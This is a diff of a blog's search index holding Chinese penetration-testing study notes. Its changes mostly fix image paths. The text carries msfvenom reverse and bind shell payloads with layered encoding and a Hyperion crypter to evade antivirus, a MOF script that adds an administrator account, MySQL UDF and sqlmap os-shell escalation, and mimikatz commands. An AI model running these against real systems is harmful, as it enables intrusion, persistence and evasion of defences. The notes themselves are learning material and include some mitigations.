@@ -1090,11 +1090,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Thinkphp5框架学习</title>
-    <url>/2020/04/19/thinkphp5-kuang-jia-xue-xi/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>SQL注入知识点总结+靶场笔记</title>
     <url>/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/</url>
     <content><![CDATA[<h2 id="SQL注入漏洞学习笔记-靶场总结"><a href="#SQL注入漏洞学习笔记-靶场总结" class="headerlink" title="SQL注入漏洞学习笔记+靶场总结"></a>SQL注入漏洞学习笔记+靶场总结</h2><h4 id="mysql相关知识点"><a href="#mysql相关知识点" class="headerlink" title="mysql相关知识点"></a>mysql相关知识点</h4><h5 id="Mysql-5-x数据结构"><a href="#Mysql-5-x数据结构" class="headerlink" title="Mysql 5.x数据结构"></a><strong>Mysql 5.x数据结构</strong></h5><p>​      在Mysql5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables（表名）、columns(列名或字段名)。</p>
@@ -1991,11 +1986,6 @@
       </tags>
   </entry>
   <entry>
-    <title>linux提权总结(一)</title>
-    <url>/2020/04/29/linux-ti-quan-zong-jie-yi/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>kali linux安装相关知识</title>
     <url>/2020/03/12/linux-an-zhuang/</url>
     <content><![CDATA[<h3 id="kali-linux安装部分相关知识"><a href="#kali-linux安装部分相关知识" class="headerlink" title="kali linux安装部分相关知识"></a>kali linux安装部分相关知识</h3><h4 id="kali安装"><a href="#kali安装" class="headerlink" title="kali安装"></a>kali安装</h4><h5 id="硬盘安装"><a href="#硬盘安装" class="headerlink" title="硬盘安装"></a>硬盘安装</h5><ul>
@@ -2420,11 +2410,11 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <h4 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h4><p>情况极少。。。。</p>
 <p>passwd 储存了用户，全用户可读，root 可写 shadow 存储密码的 hash，仅 root 可读写</p>
 <p>passwd 文件：</p>
-<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E7%BB%BC%E8%BF%B0%5CQQ%E6%88%AA%E5%9B%BE20200429144854.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429144854.png" alt=""></p>
 <p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（这样非 root 就看不到了）。而 shadow 里面最重要的就是密码的 hash</p>
-<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E7%BB%BC%E8%BF%B0%5CQQ%E6%88%AA%E5%9B%BE20200430191351.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200430191351.png" alt=""></p>
 <p>以非root用户打开，提示没有权限。</p>
-<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145009.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200429145009.png" alt=""></p>
 <h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>查看两个文件：</p>
 <figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span> -l <span class="string">/etc/passwd</span> <span class="string">/etc/shadow</span></span><br></pre></td></tr></table></figure>
 
@@ -2634,7 +2624,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
   <entry>
     <title>msf反弹payload学习</title>
     <url>/2020/04/27/msf-fan-dan-payload-xue-xi/</url>
-    <content><![CDATA[<h2 id="学习msfvenom生成反弹payload总结"><a href="#学习msfvenom生成反弹payload总结" class="headerlink" title="学习msfvenom生成反弹payload总结"></a>学习msfvenom生成反弹payload总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code>我们知道目前来说流行的shell主要有两种，一种是**正向shell(bind_shell)**一种是**反向shell(reverse_shell)**</code></pre><p><strong>正向shell</strong>:攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。(攻击者-&gt;被攻击者)</p>
+    <content><![CDATA[<h2 id="学习msfvenom生成反弹payload总结"><a href="#学习msfvenom生成反弹payload总结" class="headerlink" title="学习msfvenom生成反弹payload总结"></a>学习msfvenom生成反弹payload总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code>我们知道目前来说流行的shell主要有两种，一种是正向shell(bind_shell)一种是反向shell(reverse_shell)</code></pre><p><strong>正向shell</strong>:攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。(攻击者-&gt;被攻击者)</p>
 <p><strong>反向shell:</strong>被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。(攻击者&lt;-被攻击者)</p>
 <p><strong>nc</strong>可以实现一个很简单的正向与反向shell连接的示例：</p>
 <p>正向</p>
@@ -3108,12 +3098,12 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <p>​                 <code>python GitHack.py  http://网站地址/.git/</code></p>
 <p><strong>示例：</strong>来源(i春秋web Hello world);</p>
 <p>进入题目，查看源码，只发现一个js文件</p>
-<img src="QQ截图20200119121609.png" style="zoom:50%;" />
+<img src="QQ截图20200119121609.png" style="zoom:100%;" />
 
 <p>我们尝试使用Githack来判断网站是否有.git泄露。</p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200119121109.png" alt=""></p>
 <p>可见该网站下存在.git泄露，并且在工具文件夹下得到了泄露的文件内容。</p>
-<img src="QQ截图20200119121116.png" style="zoom:50%;" />
+<img src="QQ截图20200119121116.png" style="zoom:100%;" />
 
 <h4 id="2、-hg源码泄露漏洞"><a href="#2、-hg源码泄露漏洞" class="headerlink" title="2、.hg源码泄露漏洞"></a>2、.hg源码泄露漏洞</h4><p><strong>漏洞描述：</strong><a href="https://www.mercurial-scm.org/" target="_blank" rel="noopener">Mercurial</a>的意思是水银, 所以缩写成hg(汞), 也是一个版本管理软件. 用法和git有点类似, 但也保留了svn命令简明的特点, 而且原生地支持Windows/MacOS/Linux三大平台, 不像git需要MinGW才得以运行, 所以当今也有不少人偏向于用hg做版本控制.</p>
 <p><strong>检测方式：</strong>工具dvcs-ripper,使用方法：<code>rip-hg.pl -v -u http://域名/.hg/</code></p>
@@ -3123,9 +3113,9 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <p><strong>检测方式：</strong>1.我们可以直接使用御剑进行后台扫描，或者直接用爬虫进行爬取，从而找到robots.txt文件。</p>
 <p>​                   2.直接在网站URL输入/robots.txt进行查看。</p>
 <p><strong>修复方案：</strong>为了不让robots.txt中的内容不泄露网站的后台和隐私，我们可以使用星号（*）作为通配符进行设置。例如限制访问我们的后台admin目录，则规则为：</p>
-<p>​       <img src="QQ截图20200119110404.png" style="zoom: 80%;" /></p>
+<p>​       <img src="QQ截图20200119110404.png" style="zoom: 100%;" /></p>
 <p>​             当我们又不想泄露我们的敏感目录时，我们可以使用星号(*)作为通配符即可。</p>
-<img src="QQ截图20200119110727.png" style="zoom:80%;" />
+<img src="QQ截图20200119110727.png" style="zoom:100%;" />
 
 <p>​                 </p>
 <h4 id="5、备份文件泄露漏洞"><a href="#5、备份文件泄露漏洞" class="headerlink" title="5、备份文件泄露漏洞"></a>5、备份文件泄露漏洞</h4><p><strong>漏洞描述：</strong>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似<code>tar -czvf    bakup.tgz</code>的命令将网站进行备份,<br> 这样整站的源代码都能直接被用户打包下载了； 另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,<br> 如vim的<code>.swp</code>, 从而泄露了该网页的源代码。<br><strong>检测方式：</strong>常见的备份文件后缀名：直接在URL中进行检测。</p>
@@ -3134,7 +3124,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <p>​                   或者使用工具比如AWVS进行扫描。</p>
 <p><strong>修复方案：</strong>做好版本管理, 并利用版本管理工具过滤掉这些类型的文件, 同时不要直接在生产环境中修改或者添加文件</p>
 <h4 id="6、phpinfo-）信息泄露漏洞"><a href="#6、phpinfo-）信息泄露漏洞" class="headerlink" title="6、phpinfo(）信息泄露漏洞"></a>6、phpinfo(）信息泄露漏洞</h4><p><strong>漏洞描述</strong>：Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息。</p>
-<img src="sec_hole_13.png" style="zoom:67%;" />
+<img src="sec_hole_13.png" style="zoom:100%;" />
 
 <p><strong>检测方式 ：</strong>访问<a href="http://ip/phpinfo.php看是否成功。" target="_blank" rel="noopener">http://ip/phpinfo.php看是否成功。</a></p>
 <p><strong>修复方案 ：</strong>删除该PHP文件。</p>
@@ -3145,7 +3135,6 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <p>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站。</p>
 <h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1.不要使用svn checkout和svn up更新服务器上的代码，使用svn export（导出）功能代替。</p>
 <p>2.服务器软件（Nginx、apache、tomcat、IIS等）设置目录权限，禁止访问.svn目录</p>
-<p>m’g</p>
 <h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://ninjia.gitbook.io/secskill/web/info" target="_blank" rel="noopener">https://ninjia.gitbook.io/secskill/web/info</a></p>
 <p><a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p>
 <p><a href="https://www.cnblogs.com/Hydraxx/p/10762512.html" target="_blank" rel="noopener">https://www.cnblogs.com/Hydraxx/p/10762512.html</a></p>
@@ -5498,7 +5487,6 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
     <title>windows中常见提权方式总结(三)</title>
     <url>/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-san/</url>
     <content><![CDATA[<h2 id="提权之第三方软件提权总结"><a href="#提权之第三方软件提权总结" class="headerlink" title="提权之第三方软件提权总结"></a>提权之第三方软件提权总结</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文主要记录一些通过第三方软件提权的方式，主要包括一些ftp管理软件，远程管理软件等等。。。</p>
-<p>[TOC]</p>
 <h4 id="第三方软件serv-u提权"><a href="#第三方软件serv-u提权" class="headerlink" title="第三方软件serv-u提权"></a>第三方软件serv-u提权</h4><h5 id="serv-u简介"><a href="#serv-u简介" class="headerlink" title="serv-u简介"></a>serv-u简介</h5><ul>
 <li>Serv-U FTP Server，是一种被广泛运用的FTP服务器端软件，支持3x/9x/ME/NT/2K等全Windows系列。可以设定多个FTP服务器、限定登录用户的权限、登录主目录及空间大小等</li>
 <li>serv-u默认安装目录:C:\Program Files\rhinosoft.com\serv-U</li>
@@ -6014,16 +6002,16 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 </li>
 </ul>
 <h4 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h4><p>首先通过各种手段获取一个网站的webshell，使用菜刀连接。</p>
-<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160603.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200428160603.png" alt=""></p>
 <p>这个时候获取到的权限往往是一个低用户权限，我们尝试使用udf数据库提权</p>
 <p>我们这里上传一个暗月的mysql数据库提权大马，命名为<code>dama.php</code></p>
 <p><a href="https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）" target="_blank" rel="noopener">https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）</a></p>
-<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160926.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200428160926.png" alt=""></p>
 <p>直接网页访问，提示我们需要数据库密码，这里我们可以到网站下数据库配置文件找下<code>config.php</code></p>
-<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428163445.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200428163445.png" alt=""></p>
 <p>登录后，发现这里直接给出了一些数据库版本为：5.5.53</p>
 <p>还可以执行数据库命令：</p>
-<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428161455.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200428161455.png" alt=""></p>
 <p>这里补充一个点:</p>
 <ul>
 <li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li>
@@ -6035,7 +6023,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 
 <p>我直接在菜刀下创建plugin文件夹</p>
 <p>然后最关键的一步：<strong>导出UDF文件</strong></p>
-<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428165018.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200428165018.png" alt=""></p>
 <p>导出后，再次尝试文件已经存在，说明导入成功。</p>
 <p>现在只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
 <p>引入sys_eval函数：</p>
@@ -6046,11 +6034,11 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="symbol">'ipconfig</span>)</span><br></pre></td></tr></table></figure>
 
 <p>也可以直接使用大马这里的功能选项：</p>
-<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428174431.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200428174431.png" alt=""></p>
 <h4 id="其他udf提权方法："><a href="#其他udf提权方法：" class="headerlink" title="其他udf提权方法："></a>其他udf提权方法：</h4><h5 id="msf-udp模块"><a href="#msf-udp模块" class="headerlink" title="msf udp模块"></a>msf udp模块</h5><p>我们使用命令<code>search udf</code>即可看到udf提权payload</p>
-<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170837.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200428170837.png" alt=""></p>
 <p>进入模块，看一下需要配置选项：</p>
-<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170940.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200428170940.png" alt=""></p>
 <p>注：这里注意版本，适用于5.5.9以下，</p>
 <h5 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h5><p>使用SQLMAP的-d命令来连接服务并执行UDF提权语句；</p>
 <figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -d mysql://root:xxxxxx<span class="variable">@VPS</span>:3306/mysql --os-shell</span><br></pre></td></tr></table></figure>
@@ -6058,7 +6046,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p>
 <h4 id="提权复现："><a href="#提权复现：" class="headerlink" title="提权复现："></a>提权复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p>
 <p>然后我们将<code>nullevt.mof</code>导入到一下可写目录</p>
-<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428185617.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200428185617.png" alt=""></p>
 <p>文件内容：</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription")</span></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span></span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>;</span><br><span class="line">Name = <span class="string">"filtP2"</span>;</span><br><span class="line">Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line"><span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span></span><br><span class="line"><span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span></span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user test test /add\")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = <span class="variable">$Consumer</span>;</span><br><span class="line">Filter = <span class="variable">$EventFilter</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
@@ -6067,16 +6055,16 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">"C:/phpStudy/WWW/nullevt.mof"</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">"c:/windows/system32/wbem/mof/nullevt.mof"</span></span><br></pre></td></tr></table></figure>
 
 <p>可以使用菜刀下的数据库管理工具执行</p>
-<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190009.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200428190009.png" alt=""></p>
 <p>执行后，到win2003上查看用户：</p>
-<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190809.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200428190809.png" alt=""></p>
 <p>之后我们可以将自定义的命令改为：</p>
 <figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">net.exe localgroup administrators test /<span class="keyword">add</span></span><br></pre></td></tr></table></figure>
 
 <p>即可对添加的用户进行提权。</p>
 <h4 id="其他mof提权方法："><a href="#其他mof提权方法：" class="headerlink" title="其他mof提权方法："></a>其他mof提权方法：</h4><h5 id="msf-mof提权"><a href="#msf-mof提权" class="headerlink" title="msf mof提权"></a>msf mof提权</h5><p>使用<code>mysql_mof</code>模块，有的版本不能成功，</p>
 <h5 id="上传mof-php"><a href="#上传mof-php" class="headerlink" title="上传mof.php"></a>上传mof.php</h5><p>直接上传mof.php执行命令</p>
-<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428184713.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200428184713.png" alt=""></p>
 <p>我试了几次都失败了，这里应该需要开启mysql远程连接的功能。。。。</p>
 <h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><p>​        Mysql Root权限MOF方法提权其前提条件是能够将上传的nullevt.mof复制到系统目录下，例如c:\windows\system32\wbem\mof中，如果无法复制则会提权失败。一般对Windows2003以下操作系统效果较好，Windows2008以上由于保护机制，较少能够成功。因此可以采取以下措施进行防范：</p>
 <ul>
@@ -6084,7 +6072,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <li>Root帐号使用强加密方式，采用字母大小写+数字+特殊字符，密码位数15位以上。</li>
 <li>对Mysql数据库的mysql数据库目录权限严格限制，IIS用户无法读写该文件。</li>
 </ul>
-<h3 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL  Server提权"></a>SQL  Server提权</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="https://img-blog.csdnimg.cn/20190611101318911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p>
+<h3 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL  Server提权"></a>SQL  Server提权</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p>
 <p>xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。</p>
 <h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p><strong>利用前提：</strong></p>
 <ul>
@@ -6143,7 +6131,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <p><a href="https://www.webshell.cc/4790.html" target="_blank" rel="noopener">https://www.webshell.cc/4790.html</a></p>
 <p><a href="https://xz.aliyun.com/t/2719" target="_blank" rel="noopener">https://xz.aliyun.com/t/2719</a></p>
 <p><a href="https://blog.csdn.net/qq_26090065/article/details/81515355" target="_blank" rel="noopener">https://blog.csdn.net/qq_26090065/article/details/81515355</a></p>
-<h5 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>
+<p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>
 ]]></content>
       <categories>
         <category>渗透测试学习</category>
@@ -6240,12 +6228,8 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/shell/bind_tcp <span class="attribute">lhost</span>=10.10.10.132 <span class="attribute">lport</span>=4444 -f<span class="built_in"> raw </span>-e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f<span class="built_in"> raw </span>| msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b <span class="string">'\x00'</span> -f exe -o b.exe</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>比较编码前后的检测率<ul>
-<li>未经过编码的 a.exe 检测率是 45%</li>
+<li>比较编码前后的检测率</li>
 </ul>
-</li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/20190413174114743.png" alt="在这里插入图片描述"></p>
 <h5 id="2-隐藏shell"><a href="#2-隐藏shell" class="headerlink" title="2.隐藏shell"></a>2.隐藏shell</h5><ul>
 <li>利用模板隐藏 shell</li>
 </ul>
@@ -6257,16 +6241,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -e x86/shikata_ga_nai -i <span class="number">5</span> -a x86 --platform win -f exe &gt; d.exe</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><p>比较编码前后的检测率</p>
-<ul>
-<li>未经过编码的 c.exe 检测率是 40%</li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/20190413174123784.png" alt="在这里插入图片描述"></p>
-<ul>
-<li>经过编码的 d.exe 检测率是 30%</li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/20190413174128295.png" alt="在这里插入图片描述"></p>
-</li>
+<li>比较编码前后的检测率</li>
 </ul>
 <h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h4><ul>
 <li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li>
@@ -6277,16 +6252,8 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
 <figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># unzip Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成加密器</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成木马程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.131 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o p.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对木马程序进行加密</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># wine h.exe p.exe x.exe</span></span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><p>比较编码前后的检测率</p>
-<ul>
-<li>未经过编码的 p.exe 检测率是 45%</li>
+<li>比较编码前后的检测率</li>
 </ul>
